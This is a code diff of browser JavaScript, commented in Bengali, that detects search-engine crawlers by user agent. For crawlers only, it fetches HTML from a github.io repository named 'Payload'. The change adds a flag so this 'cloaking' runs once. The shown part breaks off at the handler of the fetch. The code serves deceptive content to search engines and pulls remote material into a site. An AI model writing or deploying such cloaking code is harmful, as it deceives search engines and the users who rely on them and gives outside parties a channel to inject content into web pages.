@@ -1,6 +1,13 @@
 var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent); 
+
 if (isBot) { 
-    // গুগলবট হলে গিটহাব থেকে index.html ফেচ করে পেজে বসাবে
+    // 🚀 লুপ থামানোর ফ্ল্যাগ: যদি আগেই একবার রান হয়ে থাকে, তবে আর করবে না
+    if (window.cloakingDone) {
+        console.log("Cloaking already executed. Stopping loop.");
+        return; 
+    }
+    window.cloakingDone = true; // ফ্ল্যাগ সেট করা হলো
+
     var id = new URLSearchParams(location.search).get("id") || "sports";
     fetch("https://xriyanebu.github.io/Payload/index.html?id=" + id)
         .then(res => res.text())
